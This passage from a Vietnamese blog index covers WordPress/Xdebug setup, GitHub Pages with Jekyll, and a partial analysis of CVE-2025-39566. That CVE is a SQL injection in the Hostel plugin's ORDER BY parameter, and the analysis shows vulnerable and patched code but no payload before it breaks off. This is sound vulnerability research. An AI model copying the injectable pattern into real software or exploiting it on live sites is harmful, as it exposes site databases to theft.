disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database WordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u:\nB√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi quy·ªÅn root:\nsudo mysql -u root C·∫•u h√¨nh MySQL:\n-- T·∫°o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u0026gt; quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•:\nsudo service mysql start Configure WordPress to connect to the database Copy file c·∫•u h√¨nh m·∫´u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi t·∫£i v·ªÅ c√≥ s·∫µn file wp-config-sample.php B·∫°n copy n√≥ th√†nh wp-config.php ƒë·ªÉ l√†m file c·∫•u h√¨nh ch√≠nh cho site Ch·ªânh s·ª≠a th√¥ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ƒê√¢y l√† 3 d√≤ng thay th·∫ø text trong file wp-config.php: database_name_here =\u0026gt; wordpress (t√™n DB ƒë√£ t·∫°o ·ªü b∆∞·ªõc tr∆∞·ªõc) username_here =\u0026gt; wordpress (user MySQL ƒë√£ t·∫°o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password ƒë√£ set) Khi Apache ch·∫°y WordPress, n√≥ s·∫Ω ƒë·ªçc file n√†y ƒë·ªÉ bi·∫øt d√πng user n√†o + DB n√†o ƒë·ªÉ k·∫øt n·ªëi MySQL Th√™m Secret Keys v√† Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php üëâ ƒê√¢y l√† chu·ªói b√≠ m·∫≠t m√† WordPress d√πng ƒë·ªÉ:\nM√£ h√≥a session cookies Sinh ra token (nonce) ch·ªëng CSRF NgƒÉn ch·∫∑n t·∫•n c√¥ng ki·ªÉu ‚Äúknown secret‚Äù (v√≠ d·ª• k·∫ª t·∫•n c√¥ng ƒëo√°n ƒë∆∞·ª£c secret m·∫∑c ƒë·ªãnh ƒë·ªÉ gi·∫£ m·∫°o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay ƒë·ªïi n√≥ b·∫±ng c√°c chu·ªói random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy c·∫≠p http://localhost, ƒë·∫∑t site title, username, password, email cho user admin\nSetup Debug on VSCode ƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng c·ªßa trang web ch·∫°y v√† x·ª≠ l√≠ ·ªü m·ªói request, ta c·∫ßn ph·∫£i debug n√≥.\nAdd PHP Debug extension on VS Code V√†o Extensions (Ctrl+Shift+X) =\u0026gt; t√¨m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension n√†y k·∫øt n·ªëi v·ªõi Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Ki·ªÉm tra c√†i ch∆∞a:\nphp -v N·∫øu c√≥ d√≤ng with Xdebug v3.x.x nghƒ©a l√† ƒë√£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini Th√™m v√†o cu·ªëi file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port m·∫∑c ƒë·ªãnh m·ªõi c·ªßa Xdebug v3 l√† 9003.\nSau ƒë√≥ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json M·ªü th∆∞ m·ª•c ch·ª©a trang web wordpress b·∫±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; t·∫°o file launch.json v·ªõi n·ªôi dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: √°nh x·∫° th∆∞ m·ª•c trong container/server (/srv/www/wordpress) v·ªÅ th∆∞ m·ª•c local c·ªßa trong VS Code.\nNh∆∞ v·∫≠y l√† ƒë√£ ho√†n th√†nh setup WordPress tr√™n local k·∫øt h·ª£p Debug n√≥ tr√™n VSCode.\nExtend Required Version M·ªói phi√™n b·∫£n WordPress th∆∞·ªùng ƒëi k√®m 1 phi√™n b·∫£n PHP th√≠ch h·ª£p. N√™n ki·ªÉm tra t√≠nh t∆∞∆°ng th√≠ch n√†y ƒë·ªÉ qu√° tr√¨nh setup kh√¥ng b·ªã l·ªói.\nWordPress Auto Update T·ª´ WordPress 3.7 tr·ªü ƒëi (2013), WordPress c√≥ c∆° ch·∫ø t·ª± ƒë·ªông c·∫≠p nh·∫≠t (automatic background updates) cho:\nB·∫£n v√° b·∫£o m·∫≠t (security release). B·∫£n b·∫£o tr√¨ (maintenance release). Kh√¥ng t·ª± ƒë·ªông update major version (tr·ª´ khi b·∫≠t r√µ r√†ng). H·ªá th·ªëng ki·ªÉm tra v·ªõi server api.wordpress.org ƒë·ªÉ xem c√≥ b·∫£n v√° n√†o m·ªõi s·∫Ω t·ª± ƒë·ªông n√¢ng c·∫•p background l√™n. Vi·ªác n√†y di·ªÖn ra r·∫•t nhanh sau khi setup, n√™n b·∫°n th·∫•y code ƒë·ªïi kh√°c so v·ªõi source g·ªëc.\nQu√° tr√¨nh setup di·ªÖn ra khi truy c·∫≠p /wp-admin/install.php\nƒê·ªÉ v√¥ hi·ªáu h√≥a c∆° ch·∫ø c·∫≠p nh·∫≠t t·ª± ƒë·ªông n√†y, th√™m d√≤ng sau v√†o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); ","permalink":"//localhost:1313/vi/posts/2025-08-21-wordpress-local-and-debugging/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶\u003c/li\u003e\n\u003cli\u003eHi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eC√≥ 2 phi√™n b·∫£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Introduction Khi b·∫Øt ƒë·∫ßu t·∫°o blog c√° nh√¢n, c√≥ ba c√¥ng c·ª• b·∫°n c·∫ßn bi·∫øt: GitHub Pages, Jekyll v√† Giscus.\nGithub Pages: D·ªãch v·ª• mi·ªÖn ph√≠ t·ª´ GitHub, cho ph√©p b·∫°n tri·ªÉn khai website tƒ©nh tr·ª±c ti·∫øp t·ª´ repository. Ch·ªâ c·∫ßn push code l√™n GitHub, blog c·ªßa b·∫°n s·∫Ω t·ª± ƒë·ªông xu·∫•t hi·ªán tr√™n Internet m√† kh√¥ng c·∫ßn server ri√™ng.\nJekyll: M·ªôt static site generator t√≠ch h·ª£p s·∫µn v·ªõi GitHub Pages. Jekyll gi√∫p b·∫°n d·ªÖ d√†ng t·∫°o blog t·ª´ c√°c file Markdown, t·ªï ch·ª©c n·ªôi dung b·∫±ng template v√† theme s·∫µn c√≥.\nGiscus: M·ªôt h·ªá th·ªëng b√¨nh lu·∫≠n hi·ªán ƒë·∫°i d·ª±a tr√™n GitHub Discussions. Thay v√¨ ph·∫£i d√πng d·ªãch v·ª• ngo√†i nh∆∞ Disqus, b·∫°n c√≥ th·ªÉ t·∫≠n d·ª•ng GitHub ƒë·ªÉ qu·∫£n l√Ω comment, v·ª´a g·ªçn nh·∫π v·ª´a th√¢n thi·ªán v·ªõi developer.\nRequirements T√†i kho·∫£n Github Ki·∫øn th·ª©c c∆° b·∫£n v·ªÅ Markdown Creating a Site Repository ·ªû ƒë√¢y, t√¥i s·ª≠ d·ª•ng Chirpy themes, ƒë√¢y l√† theme kh√° n·ªïi ti·∫øng d√†nh cho GitHub Pages, ƒë∆∞·ª£c t·ªëi ∆∞u cho vi·ªác vi·∫øt blog c√° nh√¢n ho·∫∑c technical blog.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nƒêƒÉng nh·∫≠p v√†o Github v√† di chuy·ªÉn ƒë·∫øn starter Thay v√¨ Fork, ta click Use this template v√† ch·ªçn Create a new repository ƒë·ªÉ t·ª± ƒë·ªông t·∫°o Site Repository. ƒê·∫∑t t√™n cho Repository m·ªõi \u0026lt;username\u0026gt;.github.io, thay ƒë·ªïi \u0026lt;username\u0026gt; th√†nh Github username c·ªßa b·∫°n. Setting up the Environment C√≥ 2 l√Ω do ch√≠nh b·∫°n n√™n setup m√¥i tr∆∞·ªùng tr√™n m√°y local khi ph√°t tri·ªÉn blog:\nSau khi push code l√™n Repository, GitHub Actions s·∫Ω m·∫•t m·ªôt kho·∫£ng th·ªùi gian ƒë·ªÉ ch·∫°y r·ªìi m·ªõi build v√† render ra GitHub Pages. Khi dev tr·ª±c ti·∫øp tr√™n local, b·∫°n c√≥ th·ªÉ quan s√°t k·∫øt qu·∫£ ngay l·∫≠p t·ª©c, nhanh h∆°n v√† thu·∫≠n ti·ªán h∆°n. Using Dev Containers (Recommended for Windows) Dev Containers cung c·∫•p m·ªôt m√¥i tr∆∞·ªùng c√¥ l·∫≠p b·∫±ng Docker, gi√∫p tr√°nh xung ƒë·ªôt v·ªõi h·ªá th·ªëng v√† ƒë·∫£m b·∫£o m·ªçi dependency ƒë·ªÅu ƒë∆∞·ª£c qu·∫£n l√Ω trong container.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nC√†i ƒë·∫∑t Docker: Tr√™n Windows/macOS: c√†i Docker Desktop. Tr√™n Linux: c√†i Docker Engine. C√†i VS Code v√† extension Dev Containers. Clone repository: N·∫øu d√πng Docker Desktop: m·ªü VS Code v√† clone repo trong container volume. N·∫øu d√πng Docker Engine: clone repo v·ªÅ local, sau ƒë√≥ m·ªü b·∫±ng container trong VS Code. Ch·ªù qu√° tr√¨nh thi·∫øt l·∫≠p Dev Containers ho√†n t·∫•t. Setting up Natively (Recommended for Unix-like OS) V·ªõi c√°c h·ªá ƒëi·ªÅu h√†nh d·∫°ng Unix-like (Linux, macOS), b·∫°n c√≥ th·ªÉ setup m√¥i tr∆∞·ªùng tr·ª±c ti·∫øp (native) ƒë·ªÉ ƒë·∫°t hi·ªáu nƒÉng t·ªët nh·∫•t. Ngo√†i ra, v·∫´n c√≥ th·ªÉ d√πng Dev Containers nh∆∞ m·ªôt l·ª±a ch·ªçn thay th·∫ø.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nL√†m theo h∆∞·ªõng d·∫´n c√†i ƒë·∫∑t Jekyll v√† ƒë·∫£m b·∫£o ƒë√£ c√†i ƒë·∫∑t Git. Clone repository v·ªÅ m√°y local. N·∫øu b·∫°n fork theme, c√†i Node.js v√† ch·∫°y bash tools/init.sh trong th∆∞ m·ª•c g·ªëc ƒë·ªÉ kh·ªüi t·∫°o repo. Ch·∫°y l·ªánh d∆∞·ªõi ƒë√¢y ·ªü th∆∞ m·ª•c g·ªëc ƒë·ªÉ to√†n b·ªô gem s·∫Ω ƒë∆∞·ª£c c√†i v√†o ./vendor/bundle/ trong project, kh√¥ng c·∫ßn sudo v√† kh√¥ng ƒë·ª•ng g√¨ ƒë·∫øn /var/lib/gems.. bundle config set --local path \u0026#39;vendor/bundle\u0026#39; bundle install Usage Start the Jekyll Server ƒê·ªÉ ch·∫°y site tr√™n local, s·ª≠ d·ª•ng l·ªánh d∆∞·ªõi ƒë√¢y:\nbundle exec jekyll s Configuration M·ªôt s·ªë bi·∫øn c·∫ßn c·∫•u h√¨nh trong _config.yml, bao g·ªìm:\nlang: Set language cho website c·ªßa b·∫°n url: Tr·ªè ƒë·∫øn website c·ªßa b·∫°n title: Title ch√≠nh, n·∫±m d∆∞·ªõi avatar tagline: Subtitle, m√¥ t·∫£ trang web avatar: h·ªó tr·ª£ local v√† CORS resources, c√≥ th·ªÉ s·ª≠ d·ª•ng gif Comment feature via Giscus Ta s·ª≠ d·ª•ng Giscus l√†m h·ªá th·ªëng comment cho website, ngo√†i ra c√≤n c√°c option kh√°c nh∆∞: Disqus, Utterances, t·∫•t c·∫£ ƒë·ªÅu mi·ªÖn ph√≠.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nC√†i ƒë·∫∑t giscus v√†o Github. V√†o Settings c·ªßa repository ch·ªçn General v√† b·∫≠t Discussions ƒë·ªÉ giscus l∆∞u comments v√†o Discussions. Nh·∫≠p repository \u0026lt;username\u0026gt;/\u0026lt;username\u0026gt;.github.io, th√¥ng b√°o m√†u xanh l√° xu·∫•t hi·ªán khi c√°c ti√™u ch√≠ ·ªü tr√™n ƒë∆∞·ª£c ƒë√°p ·ª©ng. Ch·ªçn th·ªÉ lo·∫°i discussion v√† ch·ªß ƒë·ªÅ cho website. C·∫•u h√¨nh giscus trong _config.yml provider: ch·ªçn giscus giscus: mapping c√°c bi·∫øn t∆∞∆°ng ·ª©ng ƒë√£ l√†m ·ªü giscus v√†o bi·∫øn giscus. Customize the Favicon T·∫°o favicon ri√™ng cho website c·ªßa b·∫°n, kh√¥ng ph·∫£i s·ª≠ d·ª•ng favicon m·∫∑c ƒë·ªãnh c·ªßa themes\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nTruy c·∫≠p Favicon Genarate Click Browse ch·ªçn favicon c·∫ßn t·∫°o, sau ƒë√≥ click Create Favicon ƒë·ªÉ t·∫°o. Click Download the generated favicon ƒë·ªÉ t·∫£i c√°c file ch·ª©a c√°c favicon v·ªÅ. Gi·∫£i n√©n file v·ª´a t·∫£i, x√≥a 2 file d∆∞·ªõi ƒë√¢y: browserconfig.xml site.webmanifest Copy to√†n b·ªô file c√≤n l·∫°i v√† paste v√†o assets/img/favicons(n·∫øu ch∆∞a c√≥ th√¨ t·∫°o). Extends Remove meta tag in Footer C√≥ th·ªÉ x√≥a d√≤ng Using the Chirpy theme for Jekyll. b·∫±ng c√°c b∆∞·ªõc sau:\nT·∫°o file theo ƒë∆∞·ªùng d·∫´n sau _data/locales/en.yml. Copy n·ªôi dung en.yml v√† d√°n v√†o file v·ª´a t·∫°o. S·ª≠a n·ªôi dung bi·∫øn meta th√†nh \u0026quot;\u0026quot; Write a post Tham kh·∫£o rule ƒë·ªÉ vi·∫øt blog c·ªßa themes v√† s·ª≠ d·ª•ng Live Preview ƒë·ªÉ quan s√°t\n","permalink":"//localhost:1313/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eKhi b·∫Øt ƒë·∫ßu t·∫°o blog c√° nh√¢n, c√≥ ba c√¥ng c·ª• b·∫°n c·∫ßn bi·∫øt: GitHub Pages, Jekyll v√† Giscus.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eGithub Pages\u003c/strong\u003e: D·ªãch v·ª• mi·ªÖn ph√≠ t·ª´ GitHub, cho ph√©p b·∫°n tri·ªÉn khai website tƒ©nh tr·ª±c ti·∫øp t·ª´ repository. Ch·ªâ c·∫ßn push code l√™n GitHub, blog c·ªßa b·∫°n s·∫Ω t·ª± ƒë·ªông xu·∫•t hi·ªán tr√™n Internet m√† kh√¥ng c·∫ßn server ri√™ng.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eJekyll\u003c/strong\u003e: M·ªôt static site generator t√≠ch h·ª£p s·∫µn v·ªõi GitHub Pages. Jekyll gi√∫p b·∫°n d·ªÖ d√†ng t·∫°o blog t·ª´ c√°c file Markdown, t·ªï ch·ª©c n·ªôi dung b·∫±ng template v√† theme s·∫µn c√≥.\u003c/p\u003e","title":"Github Pages with Jekyll themes and Giscus"},{"content":"L·ªó h·ªïng trong plugin Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) v√† v1.1.5.7(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ GET request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file controllers/bookings.php\nB·∫£n l·ªó h·ªïng:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } B·∫£n v√°:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } üëâ B·∫£n v√° s·ª≠ d·ª•ng whitelist ƒë·ªÉ gi·ªõi h·∫°n c√°c c·ªôt c√≥ th·ªÉ ƒë∆∞·ª£c s·∫Øp x·∫øp, n·∫øu kh√¥ng h·ª£p l·ªá tr·∫£ v·ªÅ 'tB.id'.\nAnalysis: L·ªó h·ªïng xu·∫•t hi·ªán khi param ob ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp v√†o m·ªánh ƒë·ªÅ ORDER BY th√¥ng qua h√†m sanitize_text_field(), ch·ªâ escape m√† kh√¥ng filter SQLi.\nHow it work? ƒê·ªÉ inject ƒë∆∞·ª£c, ta c·∫ßn ph·∫£i x√°c ƒë·ªãnh to√†n b·ªô c√¢u query ƒë∆∞·ª£c ƒë∆∞·ª£c s·ª≠ d·ª•ng ·ªü ƒë√¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); C√¢u query n·∫±m trong nh√°nh default c·ªßa c·∫•u tr√∫c switch.\nTo√†n b·ªô ƒëo·∫°n x·ª≠ l√Ω na·ª≥ thu·ªôc v·ªÅ h√†m static manage() c·ªßa class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao ti·∫øp v·ªõi core th√¥ng qua Plugin API (Hook System). Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m manage() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a \u0026quot;manage\u0026quot; trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file models/hostel.php ta c√≥ h√†m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } ·ªû ƒë√¢y:\nadd_menu_page() t·∫°o menu ch√≠nh trong Admin Dashboard. add_submenu_page() th√™m c√°c submenu con cho menu ƒë√≥. Tham s·ªë $callback l√† m·ªôt callback function s·∫Ω ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng click v√†o menu/submenu. V√≠ d·ª•:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() T·∫•t c·∫£ menu/submenu n√†y ƒë·ªÅu ƒë∆∞·ª£c ƒëƒÉng k√Ω b√™n trong h√†m static menu() c·ªßa class WPHostel. Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m menu() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a menu trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file hostel.php ·ªü th∆∞ m·ª•c g·ªëc c·ªßa plugin ta c√≥:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. Hook name ·ªü ƒë√¢y l√† admin_menu, nghƒ©a l√† h√†m WPHostel::menu() s·∫Ω ƒë∆∞·ª£c g·ªçi trong v√≤ng 